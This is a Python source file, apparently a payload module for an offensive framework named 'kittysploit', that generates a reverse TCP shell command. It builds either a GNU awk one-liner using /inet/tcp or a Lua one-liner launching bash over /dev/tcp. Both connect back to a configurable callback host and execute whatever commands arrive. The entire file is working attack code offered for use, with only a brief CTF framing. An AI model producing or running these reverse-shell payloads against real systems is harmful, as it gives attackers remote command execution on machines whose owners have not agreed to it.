from kittysploit import *


class Module(Payload):

	CLIENT_LANGUAGE = "lua"

	__info__ = {
		"name": "Lua / awk Reverse TCP",
		"description": "Reverse TCP shell via Lua or awk (minimal hosts / CTF / constrained Unix)",
		"category": PayloadCategory.CMD,
		"arch": Arch.CMD,
		"platform": Platform.UNIX,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(4444, "Callback port", True)
	engine = OptString("lua", "Engine: lua | awk", False)
	binary = OptString("", "Interpreter path override (empty = lua5.3/lua or awk)", False)

	def generate(self):
		host = str(self.lhost)
		port = int(self.lport)
		engine = str(self.engine or "lua").strip().lower()

		if engine == "awk":
			awk = str(self.binary or "awk").strip() or "awk"
			# GNU awk /dev/tcp
			return (
				f"{awk} 'BEGIN{{s=\"/inet/tcp/0/{host}/{port}\";while(1){{printf \"> \"|&s;if((s|&getline c)<=0)break;"
				f"while((c|getline)>0)print|&s;close(c)}} }}'"
			)

		lua = str(self.binary or "lua").strip() or "lua"
		# LuaSocket if available; else Lua 5.x with os.execute + io.popen via posix - use luasocket style
		# Portable-ish without luasocket using only io.popen to bash /dev/tcp bridge:
		return (
			f"{lua} -e '"
			f'local h=io.popen("bash -c \\\'exec 3<>/dev/tcp/{host}/{port};'
			f"while IFS= read -r l <&3;do eval \\\"$l\\\" >&3 2>&3;done\\'\")"
			f";h:close()'"
		)
